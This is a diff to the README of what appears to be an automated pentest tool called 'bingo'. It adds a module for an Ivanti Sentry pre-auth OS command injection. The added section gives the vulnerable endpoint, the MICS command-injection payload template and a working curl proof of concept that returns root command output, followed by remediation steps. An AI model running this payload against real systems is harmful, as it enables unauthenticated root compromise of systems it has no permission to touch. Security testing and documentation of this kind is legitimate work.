@@ -327,6 +327,80 @@ INFERRED  = port 32000 open + Aruba banner, but XXE not confirmed
 
 ---
 
+### Ivanti Sentry Pre-Auth RCE — CVE-2026-10520 (v2.1)
+
+> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)  
+> **Severity:** CVSS 10.0 Critical  
+> **Companion:** CVE-2026-10523 — Authentication Bypass (admin account creation)
+
+Ivanti Sentry (formerly MobileIron Sentry) versions before R10.5.2/R10.6.2/R10.7.1 expose an **unauthenticated POST endpoint** that passes user input directly into an internal MICS configuration engine — allowing pre-auth OS command injection as **root**.
+
+**Vulnerable endpoint:**
+```
+POST /mics/api/v2/sentry/mics-config/handleMessage
+```
+
+**AI auto-trigger conditions:**
+
+| Condition | How bingo checks |
+|-----------|-----------------|
+| Ivanti Sentry product present | `GET /mics/login.jsp` exists (HTTP 200/302) |
+| Endpoint reachable without auth | `POST /mics/.../handleMessage` → no 302 redirect |
+| Patched version detection | HTTP 302 to login page = patched, skip module |
+
+If none of the conditions match, the module is silently skipped — no impact on other scan phases.
+
+**How the injection works:**
+
+```
+message= execute system /configuration/system/commandexec
+         <commandexec>
+           <index>1</index>
+           <reqandres>OS_COMMAND_HERE</reqandres>
+         </commandexec>
+```
+
+The `message` parameter is parsed as a MICS configuration command → routed to `EXECUTE` handler → `executeNativeCommand()` via Java reflection → **root shell execution**.
+
+**PoC (bingo auto-generates in report):**
+
+```bash
+# Confirm RCE — no credentials required
+curl -sk -X POST 'https://TARGET/mics/api/v2/sentry/mics-config/handleMessage' \
+  -d 'message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>id</reqandres></commandexec>'
+
+# Expected response (VERIFIED evidence):
+# {"status":200,"data":"<result><success>uid=0(root) gid=0(root)\n</success></result>"}
+```
+
+**Evidence labeling:**
+
+```
+VERIFIED  = command output extracted from HTTP response (id / uname -a)
+LIKELY    = endpoint accessible (no 302) but no command output confirmed
+INFERRED  = /mics/login.jsp exists, endpoint not yet tested
+```
+
+**Safe probe mode (default):** bingo only executes read-only commands (`id`, `uname -a`, `hostname`) — no system modifications.
+
+**Affected versions:**
+
+| Version | Status |
+|---------|--------|
+| < R10.5.2 | **Vulnerable** |
+| < R10.6.2 | **Vulnerable** |
+| < R10.7.1 | **Vulnerable** |
+| R10.5.2+ / R10.6.2+ / R10.7.1+ | Patched |
+
+**Remediation (auto-included in report):**
+1. Upgrade Ivanti Sentry to R10.5.2 / R10.6.2 / R10.7.1 immediately
+2. Block `/mics/api/v2/sentry/mics-config/handleMessage` at the firewall
+3. Restrict Sentry management interface to isolated management VLAN only
+4. Apply CVE-2026-10523 patch simultaneously (admin account creation bypass)
+5. Review `/mics/` access logs for abnormal POST requests (incident investigation)
+
+---
+
 ### ACPV — Client-Side Authentication Bypass (v2.1)
 
 bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.
@@ -607,7 +681,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **43 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43)
+- **44 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
